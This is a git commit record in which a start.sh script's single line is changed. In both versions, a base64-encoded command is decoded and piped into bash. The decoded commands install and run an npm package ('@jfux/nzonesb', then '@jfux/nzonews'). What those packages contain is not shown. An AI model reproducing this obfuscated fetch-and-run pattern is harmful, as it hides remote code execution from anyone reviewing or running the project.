46cbaaf54acf8c46b4712df23dadf08e11be91ed
Justin Fu <65585269+Justinfu888@users.noreply.github.com>
2026-02-07 12:16:58 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,1 @@
-echo "IyEvYmluL2Jhc2gKCm5wbSBpbnN0YWxsIEBqZnV4L256b25lc2IKbnB4IG56b25lc2I=" | base64 -d | bash
+echo "IyEvYmluL2Jhc2gKCm5wbSBpbnN0YWxsIEBqZnV4L256b25ld3MKbnB4IG56b25ld3M=" | base64 -d | bash
